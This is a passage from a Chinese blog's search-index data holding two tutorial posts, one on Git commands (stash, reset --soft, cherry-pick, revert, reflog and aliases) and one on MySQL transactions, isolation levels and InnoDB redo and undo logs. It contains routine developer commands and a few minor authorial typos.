","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:1:0","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"描述 官方解释：当您想记录工作目录和索引的当前状态，但又想返回一个干净的工作目录时，请使用git stash。该命令将保存本地修改，并恢复工作目录以匹配头部提交。 stash 命令能够将还未 commit 的代码存起来，让你的工作目录变得干净。 ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:1:1","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"应用场景 我猜你心里一定在想：为什么要变干净？ 应用场景：某一天你正在 feature 分支开发新需求，突然产品经理跑过来说线上有bug，必须马上修复。而此时你的功能开发到一半，于是你急忙想切到 master 分支，然后你就会看到以下报错： 因为当前有文件更改了，需要提交commit保持工作区干净才能切分支。由于情况紧急，你只有急忙 commit 上去，commit 信息也随便写了个“暂存代码”，于是该分支提交记录就留了一条黑历史…(真人真事，看过这种提交) ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:1:2","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"命令使用 如果你学会 stash，就不用那么狼狈了。你只需要： git stash 就这么简单，代码就被存起来了。 当你修复完线上问题，切回 feature 分支，想恢复代码也只需要： git stash apply ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:1:3","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"相关命令 # 保存当前未commit的代码 git stash # 保存当前未commit的代码并添加备注 git stash save \"备注的内容\" # 列出stash的所有记录 git stash list # 删除stash的所有记录 git stash clear # 应用最近一次的stash git stash apply # 应用最近一次的stash，随后删除该记录 git stash pop # 删除最近的一次stash git stash drop 当有多条 stash，可以指定操作stash，首先使用stash list 列出所有记录： $ git stash list stash@{0}: WIP on ... stash@{1}: WIP on ... stash@{2}: On ... 应用第二条记录： $ git stash apply stash@{1} pop，drop 同理。 ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:1:4","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"vscode 集成 stash 代码 填写备注内容，也可以不填直接Enter 在STASHES菜单中可以看到保存的stash 先点击stash记录旁的小箭头，再点击 apply 或者 pop 都可恢复 stash ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:1:5","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"reset –soft ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:2:0","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"描述 完全不接触索引文件或工作树（但会像所有模式一样，将头部重置为）。这使您的所有更改的文件更改为“要提交的更改”。 回退你已提交的 commit，并将 commit 的修改内容放回到暂存区。 一般我们在使用 reset 命令时，git reset --hard会被提及的比较多，它能让 commit 记录强制回溯到某一个节点。而git reset --soft的作用正如其名，--soft(柔软的) 除了回溯节点外，还会保留节点的修改内容。 ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:2:1","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"应用场景 回溯节点，为什么要保留修改内容？ 应用场景1：有时候手滑不小心把不该提交的内容 commit 了，这时想改回来，只能再 commit 一次，又多一条“黑历史”。 应用场景2：规范些的团队，一般对于 commit 的内容要求职责明确，颗粒度要细，便于后续出现问题排查。本来属于两块不同功能的修改，一起 commit 上去，这种就属于不规范。这次恰好又手滑了，一次性 commit 上去。 ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:2:2","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"命令使用 学会reset --soft之后，你只需要： # 恢复最近一次 commit git reset --soft HEAD^ reset --soft相当于后悔药，给你重新改过的机会。对于上面的场景，就可以再次修改重新提交，保持干净的 commit 记录。 以上说的是还未 push 的commit。对于已经 push 的 commit，也可以使用该命令，不过再次 push 时，由于远程分支和本地分支有差异，需要强制推送git push -f来覆盖被 reset 的 commit。 还有一点需要注意，在reset --soft指定 commit 号时，会将该 commit 到最近一次 commit 的所有修改内容全部恢复，而不是只针对该 commit。 举个例子： commit 记录有 c、b、a。 reset 到 a。 git reset --soft 1a900ac29eba73ce817bf959f82ffcb0bfa38f75 此时的 HEAD 到了 a，而 b、c 的修改内容都回到了暂存区。 ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:2:3","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"cherry-pick ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:3:0","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"描述 给定一个或多个现有提交，应用每个提交引入的更改，为每个提交记录一个新的提交。这需要您的工作树清洁（没有从头提交的修改）。 将已经提交的 commit，复制出新的 commit 应用到分支里 ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:3:1","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"应用场景 commit 都提交了，为什么还要复制新的出来？ 应用场景1：有时候版本的一些优化需求开发到一半，可能其中某一个开发完的需求要临时上，或者某些原因导致待开发的需求卡住了已开发完成的需求上线。这时候就需要把 commit 抽出来，单独处理。 应用场景2：有时候开发分支中的代码记录被污染了，导致开发分支合到线上分支有问题，这时就需要拉一条干净的开发分支，再从旧的开发分支中，把 commit 复制到新分支。 ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:3:2","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"命令使用 复制单个 现在有一条feature分支，commit 记录如下： 需要把 b 复制到另一个分支，首先把 commitHash 复制下来，然后切到 master 分支。 当前 master 最新的记录是 a，使用cherry-pick把 b 应用到当前分支。 完成后看下最新的 log，b 已经应用到 master，作为最新的 commit 了。可以看到 commitHash 和之前的不一样，但是提交时间还是保留之前的。 复制多个 以上是单个 commit 的复制，下面再来看看 cherry-pick 多个 commit 要如何操作。 一次转移多个提交： git cherry-pick commit1 commit2 上面的命令将 commit1 和 commit2 两个提交应用到当前分支。 多个连续的commit，也可区间复制： git cherry-pick commit1^..commit2 上面的命令将 commit1 到 commit2 这个区间的 commit 都应用到当前分支（包含commit1、commit2），commit1 是最早的提交。 ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:3:3","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"cherry-pick 代码冲突 在cherry-pick多个commit时，可能会遇到代码冲突，这时cherry-pick会停下来，让用户决定如何继续操作。下面看看怎么解决这种场景。 还是 feature 分支，现在需要把 c、d、e 都复制到 master 分支上。先把起点c和终点e的 commitHash 记下来。 切到 master 分支，使用区间的cherry-pick。可以看到 c 被成功复制，当进行到 d 时，发现代码冲突，cherry-pick中断了。这时需要解决代码冲突，重新提交到暂存区。 然后使用cherry-pick --continue让cherry-pick继续进行下去。最后 e 也被复制进来，整个流程就完成了。 以上是完整的流程，但有时候可能需要在代码冲突后，放弃或者退出流程： 放弃 cherry-pick： git cherry-pick --abort 回到操作前的样子，就像什么都没发生过。 退出 cherry-pick： git cherry-pick --quit 不回到操作前的样子。即保留已经cherry-pick成功的 commit，并退出cherry-pick流程。 ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:3:4","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"revert ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:4:0","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"描述 给定一个或多个现有提交，恢复相关提交引入的更改，并记录一些这些更改的新提交。这就要求你的工作树是干净的（没有来自头部的修改）。 将现有的提交还原，恢复提交的内容，并生成一条还原记录。 ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:4:1","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"应用场景 应用场景：有一天测试突然跟你说，你开发上线的功能有问题，需要马上撤回，否则会影响到系统使用。这时可能会想到用 reset 回退，可是你看了看分支上最新的提交还有其他同事的代码，用 reset 会把这部分代码也撤回了。由于情况紧急，又想不到好方法，还是任性的使用 reset，然后再让同事把他的代码合一遍（同事听到想打人），于是你的技术形象在同事眼里一落千丈。 ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:4:2","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"命令使用 revert 普通提交 学会 revert 之后，立马就可以拯救这种尴尬的情况。 现在 master 记录如下： git revert 21dcd937fe555f58841b17466a99118deb489212 revert 掉自己提交的 commit。 因为 revert 会生成一条新的提交记录，这时会让你编辑提交信息，编辑完后 :wq 保存退出就好了。 再来看下最新的 log，生成了一条 revert 记录，虽然自己之前的提交记录还是会保留着，但你修改的代码内容已经被撤回了。 ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:4:3","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"revert 合并提交 在 git 的 commit 记录里，还有一种类型是合并提交，想要 revert 合并提交，使用上会有些不一样。 现在的 master 分支里多了条合并提交。 使用刚刚同样的 revert 方法，会发现命令行报错了。为什么会这样？在官方文档中有解释。 通常无法 revert 合并，因为您不知道合并的哪一侧应被视为主线。此选项指定主线的父编号（从1开始），并允许 revert 反转相对于指定父编号的更改 我的理解是因为合并提交是两条分支的交集节点，而 git 不知道需要撤销的哪一条分支，需要添加参数 -m 指定主线分支，保留主线分支的代码，另一条则被撤销。 -m 后面要跟一个 parent number 标识出\"主线\"，一般使用 1 保留主分支代码。 git revert -m 1 \u003ccommitHash\u003e ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:4:4","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"revert 合并提交后，再次合并分支会失效 还是上面的场景，在 master 分支 revert 合并提交后，然后切到 feature 分支修复好 bug，再合并到 master 分支时，会发现之前被 revert 的修改内容没有重新合并进来。 因为使用 revert 后， feature 分支的 commit 还是会保留在 master 分支的记录中，当你再次合并进去时，git 判断有相同的 commitHash，就忽略了相关 commit 修改的内容。 这时就需要 revert 掉之前 revert 的合并提交，有点拗口，接下来看操作吧。 现在 master 的记录是这样的。 再次使用 revert，之前被 revert 的修改内容就又回来了。 ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:4:5","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"reflog ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:5:0","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"描述 此命令管理重录中记录的信息。 如果说reset --soft是后悔药，那 reflog 就是强力后悔药。它记录了所有的 commit 操作记录，便于错误操作后找回记录。 ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:5:1","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"应用场景 应用场景：某天你眼花，发现自己在其他人分支提交了代码还推到远程分支，这时因为分支只有你的最新提交，就想着使用reset --hard，结果紧张不小心记错了 commitHash，reset 过头，把同事的 commit 搞没了。没办法，reset --hard是强制回退的，找不到 commitHash 了，只能让同事从本地分支再推一次（同事瞬间拳头就硬了，怎么又是你）。于是，你的技术形象又一落千丈。 ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:5:2","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"命令使用 分支记录如上，想要 reset 到 b。 误操作 reset 过头，b 没了，最新的只剩下 a。 这时用git reflog查看历史记录，把错误提交的那次 commitHash 记下。 再次 reset 回去，就会发现 b 回来了。 ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:5:3","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"设置 Git 短命令 对我这种喜欢敲命令而不用图形化工具的爱好者来说，设置短命令可以很好的提高效率。下面介绍两种设置短命令的方式。 ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:6:0","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"方式一 git config --global alias.ps push ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:6:1","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"方式二 打开全局配置文件 vim ~/.gitconfig 写入内容 [alias] co = checkout ps = push pl = pull mer = merge --no-ff cp = cherry-pick ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:6:2","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"使用 # 等同于 git cherry-pick \u003ccommitHash\u003e git cp \u003ccommitHash\u003e ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:6:3","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"总结 本文主要分享了5个在开发中实用的 Git 命令和设置短命令的方式。 stash：存储临时代码。 reset --soft：软回溯，回退 commit 的同时保留修改内容。 cherry-pick：复制 commit。 revert：撤销 commit 的修改内容。 reflog：记录了 commit 的历史操作。 ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:7:0","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["数据库"],"content":"初识事务 ","date":"2023-09-27","objectID":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/:0:0","tags":["Mysql事务"],"title":"Mysql事务处理原理","uri":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/"},{"categories":["数据库"],"content":"为什么需要事务？ 这里又要掏出那个烂大街的银行转账案例了，以A、B两个账户的转账为例，假设现在要从A账户向B账户中转入1000员，当进行转账时，需要先从银行账户A中取出钱，然后再存入银行账户B中，SQL样本如下： // 第一步：A账户余额减少减少1000 update balance set money = money -500 where name= ‘A’; // 第二步：B账户余额增加1000 update balance set money = money +500 where name= ‘B’; 如果在完成了第1步的时候突然宕机了，A的钱减少了而B的钱没有增加，那A岂不是白白丢了1000元，这时候就需要用到我们的事务了，开启事务后SQL样本如下： // 第一步：开始事务 start transaction; // 第二步：A账户余额减少减少1000 update balance set money = money -500 where name= ‘A’; // 第三步：B账户余额增加1000 update balance set money = money +500 where name= ‘B’; // 第四步：提交事务 commit; ","date":"2023-09-27","objectID":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/:1:0","tags":["Mysql事务"],"title":"Mysql事务处理原理","uri":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/"},{"categories":["数据库"],"content":"什么是事务 事务（Transaction）是访问和更新数据库的程序执行单元；事务中可能包含一个或多个sql语句，这些语句要么都执行成功，要么全部执行失败。 ","date":"2023-09-27","objectID":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/:2:0","tags":["Mysql事务"],"title":"Mysql事务处理原理","uri":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/"},{"categories":["数据库"],"content":"事务的四大特性（ACID） 原子性（Atomicity，或称不可分割性） 「一个事务必须被视为一个不可分割的最小工作单元，整个事务中所有的操作要么全部提交成功，要么全部失败回滚，对于一个事务来说，不可能只执行其中的一部分操作，这就是事务的原子性」 一致性（Consistency） 「数据库总是从一个一致性的状态转换到另外一个一致性的状态，在事务开始之前和之后，数据库的完整性约束没有被破坏。在前面的例子中，事务结束前后A、B账户总额始终保持不变」 隔离性（Isolation） 「隔离性是指，事务内部的操作与其他事务是隔离的，并发执行的各个事务之间不能互相干扰。严格的隔离性，对应了事务隔离级别中的Serializable (可串行化)，但实际应用中出于性能方面的考虑很少会使用可串行化。」 持久性（Durability） 「持久性是指事务一旦提交，它对数据库的改变就应该是永久性的。接下来的其他操作或故障不应该对其有任何影响。」 ","date":"2023-09-27","objectID":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/:3:0","tags":["Mysql事务"],"title":"Mysql事务处理原理","uri":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/"},{"categories":["数据库"],"content":"事务的隔离级别 在前文中我们介绍了隔离性，但实际上隔离性比想象的要复杂的多。在SQL标准中定义了四种隔离级别，每一种隔离级别都规定了一个事务所做的修改，哪些在事务内和事务间是可见的，哪些是不可见的，较低级别的隔离通常可以执行跟高的并发，系统的开销也更低 ","date":"2023-09-27","objectID":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/:4:0","tags":["Mysql事务"],"title":"Mysql事务处理原理","uri":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/"},{"categories":["数据库"],"content":"未提交读（READ UNCOMMITTED） 在这个隔离级别下，事务的修改即使没有提交，对其他事务也是可见的。事务可以读取未提交的数据，这也被称之为脏读。这个级别会带来很多问题，从性能上来说，READ UNCOMMITTED不会比其他的级别好太多，但是却会带来很多问题，除非真的有非常必要的理由，在实际应用中一般很少使用。 ","date":"2023-09-27","objectID":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/:4:1","tags":["Mysql事务"],"title":"Mysql事务处理原理","uri":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/"},{"categories":["数据库"],"content":"提交读（REDA COMMITED） 大多数数据系统的默认隔离级别都是REDA COMMITED（MySql不是），REDA COMMITED满足前面提到的隔离性的简单定义：一个事务开始时，只能看到已经提交的事务所做的修改。换句话说，一个事物从开始直到提交前，所做的修改对其他事务不可见。这个级别有时候也叫做不可重复读，因为执行两次相同的查询可能会得到不同的结果。 ","date":"2023-09-27","objectID":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/:4:2","tags":["Mysql事务"],"title":"Mysql事务处理原理","uri":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/"},{"categories":["数据库"],"content":"可重复读（REPEATABLE READ） REPEATABLE READ解决了脏读以及不可重复度的问题。该级别保证了同一个事务多次读取同样记录的结果是一致的。但是理论上，可重复度还是无法解决另外一个幻读的问题。所谓幻读，指的是当某个事务在读取某个范围内的记录时，另外一个事务又在该范围内插入了新的记录，当之前的事务再次读取该范围的记录时，就会产生幻行。 不可重复读跟幻读的区别在于，「前者是数据发生了变化，后者是数据的行数发生了变化」。 ","date":"2023-09-27","objectID":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/:4:3","tags":["Mysql事务"],"title":"Mysql事务处理原理","uri":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/"},{"categories":["数据库"],"content":"可串行化（SERIALIZABLE） SERIALIZABLE是最高的隔离级别，它通过强制事务串行执行，避免前面说的幻读。简单来说SERIALIZABLE会在读取的每一行数据上都加锁，所以可能会导致大量的超时和锁争用的问题。实际应用中也很少使用这个隔离级别，只有在非常需要确保数据一致性而且可以接受没有并发的情况下，才考虑此级别。 ","date":"2023-09-27","objectID":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/:4:4","tags":["Mysql事务"],"title":"Mysql事务处理原理","uri":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/"},{"categories":["数据库"],"content":"保存点 我们可以在事务执行的过程中定义保存点，在回滚时直接指定回滚到指定的保存点而不是事务开始之初，有点像我们玩游戏的时候可以存档而不是每次都要重新再来 定义保存点的语法如下： SAVEPOINT 保存点名称; 当我们想回滚到某个保存点时，可以使用下边这个语句（下边语句中的单词WORK和SAVEPOINT是可有可无的）： ROLLBACK [WORK] TO [SAVEPOINT] 保存点名称; MySQL中的事务跟原理 ","date":"2023-09-27","objectID":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/:5:0","tags":["Mysql事务"],"title":"Mysql事务处理原理","uri":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/"},{"categories":["数据库"],"content":"MySQL中的事务 「MySQL中不是所有的存储引擎都支持事务」，例如MyISAM就不支持事务，实际上支持事务的只有InnoDB跟NDB Cluster，「本文关于事务的分析都是基于InnoDB」 「MySQL默认采用的是自动提交的方式」，也就是说如果不是显示的开始一个事务，则系统会自动向数据库提交结果。在当前连接中，还可以通过设置AUTOCONNIT变量来启用或者禁用自动提交模式。 开启自动提交功能 SET AUTOCOMMIT = 1; MySQL中默认情况下的自动提交功能是已经开启的。 关闭自动提交功能。 SET AUTOCOMMIT = 0; 关闭自动提交功能后，只用当执行COMMIT命令后，MySQL才将数据表中的资料提交到数据库中。如果执行ROLLBACK命令，数据将会被回滚。如果不提交事务，而终止MySQL会话，数据库将会自动执行回滚操作。 「MySQL的默认隔离级别是可重复读（REPEATABLE READ）」。 ","date":"2023-09-27","objectID":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/:6:0","tags":["Mysql事务"],"title":"Mysql事务处理原理","uri":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/"},{"categories":["数据库"],"content":"事务的实现原理 我们要探究MySQL中事务的实现原理，实际上就是要弄明天它的ACID特性是如何实现的，在这里有必要先说明的是，「ACID中的一致性是事务的最终目标，前面提到的原子性、持久性和隔离性，都是为了保证数据库状态的一致性」。所以我们要分析的就是MySQL的原子性、持久性和隔离性的实现原理，在分析事务的实现原理之前我们需要补充一些InnoDB的相关知识 InnoDB是一个将表中的数据存储到磁盘上的存储引擎，所以即使关机后重启我们的数据还是存在的。而真正**「处理数据的过程是发生在内存中的」，「所以需要把磁盘中的数据加载到内存中，如果是处理写入或修改请求的话，还需要把内存中的内容刷新到磁盘上」。而我们知道读写磁盘的速度非常慢，和内存读写差了几个数量级，所以当我们想从表中获取某些记录时，InnoDB存储引擎需要一条一条的把记录从磁盘上读出来么？不，那样会慢死，InnoDB采取的方式是：「将数据划分为若干个页，以页作为磁盘和内存之间交互的基本单位，InnoDB中页的大小一般为 *16* KB。也就是在一般情况下，一次最少从磁盘中读取16KB的内容到内存中，一次最少把内存中的16KB内容刷新到磁盘中。」** 我们还需要对MySQL中的日志有一定了解。MySQL的日志有很多种，如二进制日志（bin log）、错误日志、查询日志、慢查询日志等，此外InnoDB存储引擎还提供了两种事务日志：「redo log(重做日志)和undo log(回滚日志)。其中redo log用于保证事务持久性；undo log则是事务原子性和隔离性实现的基础。」 InnoDB作为MySQL的存储引擎，数据是存放在磁盘中的，但如果每次读写数据都需要磁盘IO，效率会很低。为此，InnoDB提供了**「缓存(Buffer Pool)」，Buffer Pool中包含了磁盘中部分数据页的映射，作为访问数据库的缓冲：「当从数据库读取数据时，会首先从Buffer Pool中读取，如果Buffer Pool中没有，则从磁盘读取后放入Buffer Pool；当向数据库写入数据时，会首先写入Buffer Pool，Buffer Pool中修改的数据会定期刷新到磁盘中（这一过程称为刷脏）。」** InnoDB存储引擎文件主要可以分为两类，表空间文件及重做日志文件（redo log file）,表空间文件又可以细分为两类，共享表空间跟独立表空间。「undo log位于共享表空间中的undo段中」，每个表空间都被划分成了若干个页面，「凡是页面的读写都在buffer pool中进行，这意味着undo log也需要先写入到buffer pool，所以undo log的生成也需要持久化，也就是说undo log的生成需要记录对应的redo log」。(注意：不是所有的undo log的生成都会产生对应的redo log，对于操作临时表生成的undo log并不会生成对应的undo log，因为修改临时表而产生的undo日志只需要在系统运行过程中有效，如果系统奔溃了，那么在重启时也不需要恢复这些undo日志所在的页面，所以在写针对临时表的Undo页面时，并不需要记录相应的redo日志。) ","date":"2023-09-27","objectID":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/:7:0","tags":["Mysql事务"],"title":"Mysql事务处理原理","uri":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/"},{"categories":["数据库"],"content":"持久性实现原理 ​ 通过前面的补充知识我们知道InnoDB引入了Buffer Pool来优化读写的性能，但是虽然Buffer Pool优化了性能，但同时也带来了新的问题：「如果MySQL宕机，而此时Buffer Pool中修改的数据还没有刷新到磁盘，就会导致数据的丢失，事务的持久性无法保证」。 ​ 基于此，redo log就诞生了，「redo log是物理日志，记录的是数据库中数据库中物理页的情况」，redo log包括两部分：一是内存中的日志缓冲(redo log buffer)，该部分日志是易失性的；二是磁盘上的重做日志文件(redo log file)，该部分日志是持久的。在概念上，innodb通过**「force log at commit」**机制实现事务的持久性，即在事务提交的时候，必须先将该事务的所有事务日志写入到磁盘上的redo log file和undo log file中进行持久化。 ​ 看到这里可能有的小伙伴又会有疑问了，既然redo log也需要在事务提交时将日志写入磁盘，为什么它比直接将Buffer Pool中修改的数据写入磁盘(即刷脏)要快呢？主要有以下两方面的原因： （1）刷脏是随机IO，因为每次修改的数据位置随机，但写redo log是追加操作，属于顺序IO。 （2）刷脏是以数据页（Page）为单位的，MySQL默认页大小是16KB，一个Page上一个小修改都要整页写入；而redo log中只包含真正需要写入的部分，无效IO大大减少。 这里我以文章开头的例子进行说明redo log为何能保证持久性： // 第一步：开始事务 start transaction; // 第二步：A账户余额减少减少1000 update balance set money = money -500 where name= ‘A’; // 第三步：B账户余额增加1000 update balance set money = money +500 where name= ‘B’; // 第四步：提交事务 commit; redo ❝ 这里需要对redo log的刷盘补充一点内容： MySQL支持用户自定义在commit时如何将log buffer中的日志刷log file中。这种控制通过变量 innodb_flush_log_at_trx_commit 的值来决定。该变量有3种值：0、1、2，「默认为1」。但注意，这个变量只是控制commit动作是否刷新log buffer到磁盘。 当设置为1的时候，事务每次提交都会将log buffer中的日志写入os buffer并调用fsync()函数刷到log file on disk中。这种方式即使系统崩溃也不会丢失任何数据，但是因为每次提交都写入磁盘，IO的性能较差。 当设置为0的时候，事务提交时不会将log buffer中日志写入到os buffer（内核缓冲区），而是每秒写入os buffer并调用fsync()写入到log file on disk中。也就是说设置为0时是(大约)每秒刷新写入到磁盘中的，当系统崩溃，会丢失1秒钟的数据。 当设置为2的时候，每次提交都仅写入到os buffer，然后是每秒调用fsync()将os buffer中的日志写入到log file on disk。 「可以看到设置为0或者2时，都有可能丢失1s的数据」 ❞ ","date":"2023-09-27","objectID":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/:7:1","tags":["Mysql事务"],"title":"Mysql事务处理原理","uri":"/posts/mysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%8E%9F%E7%90%86/"},{"categories":["数据库"],"content":"原子性实现原理 前面提到了，所谓原子性就是指整个事务是一个不可分隔的整体，组成事务的一组SQL要么全部成功，要么全部失败，要达到这个目的就意味着当某一个SQL执行失败时，我们要能够撤销掉其它SQL的执行结果，在MySQL中这是依赖undo log(回滚日志)来实现。 undo log属于**「逻辑日志」（前面提到的redo log属于物理日志，记录的是数据页的情况），我们可以这么认为，「当delete一条记录时，undo log中会记录一条对应的insert记录，反之亦然，当update一条记录时，它记录一条对应相反的update记录。」** 但执行发生异常时，会根据undo log中的记录进行回滚。undo log主要分为两种 insert undo log update undo log 「insert undo log是指在insert 操作中产生的undo log」，因为insert操作的记录，只对事务本身可见，对其他事务不可见。故该undo log可以在事务提交后直接删除，不需要进行purge操作。 「而update undo log记录的是对*delete 和update*操作产生的undo log」，该undo 